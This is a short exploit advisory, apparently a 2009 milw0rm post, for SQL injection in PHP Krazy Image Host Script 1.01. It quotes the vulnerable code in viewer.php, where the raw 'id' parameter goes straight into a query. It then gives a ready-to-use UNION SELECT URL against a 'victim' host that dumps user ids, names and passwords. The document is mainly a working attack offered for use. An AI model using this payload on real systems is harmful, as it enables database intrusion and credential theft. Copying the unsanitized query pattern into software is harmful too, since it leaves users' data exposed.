@@ -1,0 +1,29 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : PHP Krazy Image Host Script 1.01
+Download       : http://www.hotscripts.com/listings/jump/download/66961/
+Vulnerability  : Sql Injection
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/viewer.php
+
+[Code]
+	 	$id = $_GET['id']; [...]
+$query="SELECT * FROM images WHERE id=" . $id;
+$result = mysql_query($query);
+[/code]
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: http://victim.it/viewer.php?id=-1 union select
+0,0,0,concat(id,char(45),user,char(45),password),0,0, from users--
+
+########################################################################################
+
+# milw0rm.com [2009-02-12]
